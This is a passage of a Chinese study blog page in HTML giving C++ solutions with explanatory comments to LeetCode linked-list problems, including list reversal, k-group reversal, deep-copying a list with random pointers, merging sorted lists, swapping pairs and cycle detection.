class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 定义链表节点结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkedNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> val;</span><br><span class="line">        LinkedNode* next;</span><br><span class="line">        <span class="built_in">LinkedNode</span>(<span class="keyword">int</span> val):<span class="built_in">val</span>(val), <span class="built_in">next</span>(<span class="literal">nullptr</span>)&#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化链表</span></span><br><span class="line">    <span class="built_in">MyLinkedList</span>() &#123;</span><br><span class="line">        _dummyHead = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(<span class="number">0</span>); <span class="comment">// 这里定义的头结点 是一个虚拟头结点，而不是真正的链表头结点</span></span><br><span class="line">        _size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取链表中下标为 index 的节点的值。如果下标无效，则返回 -1</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt; (_size - <span class="number">1</span>) || index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//真正头结点 _dummyHead-&gt;next 不找前驱，找本结点</span></span><br><span class="line">        LinkedNode* cur = _dummyHead-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(index--)&#123;  </span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 头插：head前面插入结点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAtHead</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        newNode-&gt;next = _dummyHead-&gt;next;</span><br><span class="line">        _dummyHead-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尾插：在链表最后面添加一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAtTail</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        LinkedNode* cur = _dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next != <span class="literal">nullptr</span>)&#123;<span class="comment">//找尾结点</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到 下标为 index 的节点 之前</span></span><br><span class="line">    <span class="comment">// index 等于链表的长度，则说明是新插入的节点为链表的尾结点</span></span><br><span class="line">    <span class="comment">// index大于链表的长度，则返回空</span></span><br><span class="line">    <span class="comment">// index小于0，则在头部插入节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAtIndex</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; _size) </span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>) </span><br><span class="line">            index = <span class="number">0</span>;        </span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        LinkedNode* cur = _dummyHead;<span class="comment">//找前驱：_dummyHead</span></span><br><span class="line">        <span class="keyword">while</span>(index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        newNode-&gt;next = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除 下标为 index 的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAtIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= _size || index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedNode* cur = _dummyHead;<span class="comment">// 找前驱：_dummyHead</span></span><br><span class="line">        <span class="keyword">while</span>(index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedNode* tmp = cur-&gt;next;<span class="comment">//被删结点 tmp</span></span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> tmp;</span><br><span class="line">        tmp=<span class="literal">nullptr</span>;</span><br><span class="line">        _size--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印链表</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printLinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LinkedNode* cur = _dummyHead-&gt;next;</span><br><span class="line">        <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">            cout &lt;&lt; cur-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> _size;</span><br><span class="line">    LinkedNode* _dummyHead;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="206-链表反转"><a href="#206-链表反转" class="headerlink" title="206 链表反转"></a>206 链表反转</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三个指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;<span class="comment">//最后cur和tmp均指向原始链表的末尾null,而pre指向原始链表的尾结点</span></span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="25-K-个一组翻转链表"><a href="#25-K-个一组翻转链表" class="headerlink" title="25 K 个一组翻转链表"></a>25 K 个一组翻转链表</h3><p>给你链表的头节点 head ，每 k 个节点一组进行翻转，请你返回修改后的链表。<br>k 是一个正整数，它的值小于或等于链表的长度。如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。<br>你【不能只是单纯的改变节点内部的值，而是需要实际进行节点交换】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 翻转一个子链表，并且返回新的头与尾</span></span><br><span class="line">    <span class="function">pair&lt;ListNode*, ListNode*&gt; <span class="title">myReverse</span><span class="params">(ListNode* head, ListNode* tail)</span> </span>&#123;</span><br><span class="line">        ListNode* prev = tail-&gt;next;</span><br><span class="line">        ListNode* p = head;</span><br><span class="line">        <span class="keyword">while</span> (prev != tail) &#123;</span><br><span class="line">            ListNode* nex = p-&gt;next;</span><br><span class="line">            p-&gt;next = prev;</span><br><span class="line">            prev = p;</span><br><span class="line">            p = nex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;tail, head&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseKGroup</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        ListNode* hair = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        hair-&gt;next = head;</span><br><span class="line">        ListNode* pre = hair;</span><br><span class="line">        <span class="keyword">while</span> (head) &#123;</span><br><span class="line">            ListNode* tail = pre;</span><br><span class="line">            <span class="comment">// 查看剩余部分长度是否大于等于 k</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">                tail = tail-&gt;next;</span><br><span class="line">                <span class="keyword">if</span> (!tail) &#123;</span><br><span class="line">                    <span class="keyword">return</span> hair-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ListNode* nex = tail-&gt;next;</span><br><span class="line">            <span class="built_in">tie</span>(head, tail) = <span class="built_in">myReverse</span>(head, tail);</span><br><span class="line">            <span class="comment">// 把子链表重新接回原链表</span></span><br><span class="line">            pre-&gt;next = head;</span><br><span class="line">            tail-&gt;next = nex;</span><br><span class="line">            pre = tail;</span><br><span class="line">            head = tail-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hair-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="138-复制带随机指针的链表"><a href="#138-复制带随机指针的链表" class="headerlink" title="138 复制带随机指针的链表"></a>138 复制带随机指针的链表</h3><p>给你一个长度为 n 的链表，【每个节点包含一个额外增加的随机指针 random】，该指针可以指向链表中的任何节点或空节点。</p><p>构造这个链表的 <strong>深拷贝</strong>。返回复制链表的头节点。</p><p>例如，如果原链表中有 X 和 Y 两个节点，其中 X.random –&gt; Y 。那么在复制链表中对应的两个节点 x 和 y ，同样有 x.random –&gt; y 。</p><p>用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示：</p><pre><code>int val;Node* next;Node* random;</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;Node*,Node*&gt; maap;<span class="comment">//记录每个结点的 新结点 的创建情况</span></span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">if</span>(!maap.<span class="built_in">count</span>(head))&#123;<span class="comment">//不在，还没创建  </span></span><br><span class="line">            Node *newHead = <span class="keyword">new</span> <span class="built_in">Node</span>(head-&gt;val);<span class="comment">//创建新结点</span></span><br><span class="line">            maap[head] = newHead;<span class="comment">//存入哈希表</span></span><br><span class="line">            newHead-&gt;next = <span class="built_in">copyRandomList</span>(head-&gt;next);</span><br><span class="line">            newHead-&gt;random = <span class="built_in">copyRandomList</span>(head-&gt;random);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> maap[head];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//很方便 理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;Node*,Node*&gt; maap;<span class="comment">//记录每个结点的 新结点 的创建情况</span></span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        Node *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            Node *node = <span class="keyword">new</span> <span class="built_in">Node</span>(cur-&gt;val);</span><br><span class="line">            maap[cur] = node;<span class="comment">//全部装入</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125; </span><br><span class="line">        cur = head;<span class="comment">//再次指向 head 进行遍历</span></span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            <span class="comment">//关键在 下面这两句</span></span><br><span class="line">            maap[cur]-&gt;next = maap[cur-&gt;next];</span><br><span class="line">            maap[cur]-&gt;random = maap[cur-&gt;random];</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maap[head];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="21-归并两个有序链表——升序-升序-gt-升序"><a href="#21-归并两个有序链表——升序-升序-gt-升序" class="headerlink" title="21 归并两个有序链表——升序+升序-&gt;升序"></a>21 归并两个有序链表——升序+升序-&gt;升序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归——不好理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">nullptr</span> || l2==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> (l1==<span class="literal">nullptr</span>)?l2:l1;</span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val&lt;=l2-&gt;val)&#123;</span><br><span class="line">            l1-&gt;next = <span class="built_in">mergeTwoLists</span>(l1-&gt;next,l2);</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l2-&gt;next = <span class="built_in">mergeTwoLists</span>(l1,l2-&gt;next);</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代    </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *pre = dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span> &amp;&amp; l2!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">                pre-&gt;next = l1;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre-&gt;next = l2;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//合并之后，把剩余某个链表 全部赋值即可</span></span><br><span class="line">        pre-&gt;next = l1==<span class="literal">NULL</span>? l2:l1;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="23-合并-K-个升序链表"><a href="#23-合并-K-个升序链表" class="headerlink" title="23 合并 K 个升序链表"></a>23 合并 K 个升序链表</h3><p>给你一个【链表数组】，每个链表都已经按【升序排列】。<br>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode *l1,ListNode *l2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">nullptr</span> || l2==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1==<span class="literal">nullptr</span>?l2:l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val&lt;=l2-&gt;val)&#123;</span><br><span class="line">            l1-&gt;next = <span class="built_in">merge</span>(l1-&gt;next,l2);</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l2-&gt;next = <span class="built_in">merge</span>(l1,l2-&gt;next);</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeKLists</span><span class="params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = lists.<span class="built_in">size</span>();</span><br><span class="line">        ListNode *node = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            node = <span class="built_in">merge</span>(node,lists[i]);<span class="comment">//顺序合并</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24 两两交换链表中的节点"></a>24 两两交换链表中的节点</h3><p>给你一个链表，<u>两两交换</u>其中相邻的节点，并返回交换后链表的头节点。你必须<strong>在不修改节点内部的值的情况下完成</strong>本题（即，只能进行节点交换）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">swapPairs</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);<span class="comment">//虚结点</span></span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        ListNode *temp = dummy;<span class="comment">//temp 虚结点</span></span><br><span class="line">        <span class="keyword">while</span>(temp-&gt;next != <span class="literal">nullptr</span> &amp;&amp; temp-&gt;next-&gt;next != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *node1 = temp-&gt;next;<span class="comment">//第一个结点</span></span><br><span class="line">            ListNode *node2 = temp-&gt;next-&gt;next;<span class="comment">//第二个结点</span></span><br><span class="line">            temp-&gt;next = node2;</span><br><span class="line">            node1-&gt;next = node2-&gt;next;</span><br><span class="line">            node2-&gt;next = node1;</span><br><span class="line">            temp = node1;<span class="comment">//后移</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="141-环形链表——是否存在环"><a href="#141-环形链表——是否存在环" class="headerlink" title="141 环形链表——是否存在环"></a>141 环形链表——是否存在环</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(N) N结点数</span></span><br><span class="line"><span class="comment">    最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;ListNode*&gt; pot;<span class="comment">//unordered_set</span></span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pot.<span class="built_in">count</span>(head))<span class="comment">//set 中的 count()函数</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//如果存在（该点已经访问过），其值必是1，证明存在环</span></span><br><span class="line">            pot.<span class="built_in">insert</span>(head);<span class="comment">//没访问过，则插入哈希表</span></span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>「Floyd 判圈算法」（又称龟兔赛跑算法）</strong></p><p><strong>定义两个指针，一快一慢。慢指针每次只移动一步，而快指针每次移动两步</strong></p><ul><li>如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针 </span></span><br><span class="line"><span class="comment">    定义两个指针，一快一慢。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。</span></span><br><span class="line"><span class="comment">    如果在移动的过程中，快指针反过来【追上】慢指针，就说明该链表为环形链表。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    注意：快指针速度2；慢指针速度1；所以快指针相对于慢指针而言每次前进1个结点，所以如果有环的话一定会相遇</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(slow != fast)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fast == <span class="literal">nullptr</span> || fast-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//fast一直没有进入环</span></span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow-&gt;next;<span class="comment">//慢指针 每次1步</span></span><br><span class="line">            fast = fast-&gt;next-&gt;next;<span class="comment">//快指针 每次2步</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="142-环形链表-II——找环的入口"><a href="#142-环形链表-II——找环的入口" class="headerlink" title="142 环形链表 II——找环的入口"></a>142 环形链表 II——找环的入口</h3>返回进入环的第一个结点，如果没有环，则返回NULL<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> 